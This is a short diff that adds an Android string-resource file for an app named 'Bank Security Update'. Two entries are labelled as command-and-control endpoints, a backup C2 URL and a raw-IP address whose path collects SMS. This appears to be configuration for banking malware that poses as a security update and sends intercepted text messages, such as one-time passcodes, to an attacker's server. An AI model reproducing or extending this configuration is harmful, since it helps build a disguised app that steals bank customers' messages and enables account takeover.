@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Bank Security Update</string>
+    <string name="backup_c2">https://test-c2bank.info/api/v1/update</string>
+    <string name="c2_endpoint">http://185.220.101.5/collect/sms</string>
+</resources>
